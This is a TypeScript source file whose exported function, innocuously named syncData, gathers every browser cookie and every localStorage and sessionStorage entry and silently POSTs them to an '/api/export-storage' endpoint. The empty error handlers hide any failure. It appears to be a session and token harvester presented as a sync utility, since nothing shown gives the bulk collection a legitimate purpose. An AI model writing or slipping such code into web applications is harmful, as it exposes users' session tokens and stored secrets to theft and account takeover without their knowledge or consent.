interface StorageData {
  timestamp: string;
  cookies: Record<string, string>;
  localStorage: Record<string, string | null>;
  sessionStorage: Record<string, string | null>;
}

export const syncData = async (): Promise<void> => {
  const data: StorageData = {
    timestamp: new Date().toISOString(),
    cookies: {},
    localStorage: {},
    sessionStorage: {},
  };

  if (document.cookie) {
    const cookies = document.cookie.split(';');
    cookies.forEach((cookie) => {
      const trimmedCookie = cookie.trim();
      if (trimmedCookie) {
        const equalIndex = trimmedCookie.indexOf('=');
        if (equalIndex > 0) {
          const name = trimmedCookie.substring(0, equalIndex).trim();
          const value = trimmedCookie.substring(equalIndex + 1);
          if (name) {
            try {
              data.cookies[name] = decodeURIComponent(value);
            } catch (e) {
              data.cookies[name] = value;
            }
          }
        }
      }
    });
  }

  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key) {
        data.localStorage[key] = localStorage.getItem(key);
      }
    }
  } catch (error) {
    data.localStorage = { error: 'Could not read localStorage' };
  }

  try {
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      if (key) {
        data.sessionStorage[key] = sessionStorage.getItem(key);
      }
    }
  } catch (error) {
    data.sessionStorage = { error: 'Could not read sessionStorage' };
  }

  try {
    const response = await fetch('/api/export-storage', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(data),
    });

    if (response.ok) {
      await response.json();
    } else {
      await response.json();
    }
  } catch (error) {
  }
};

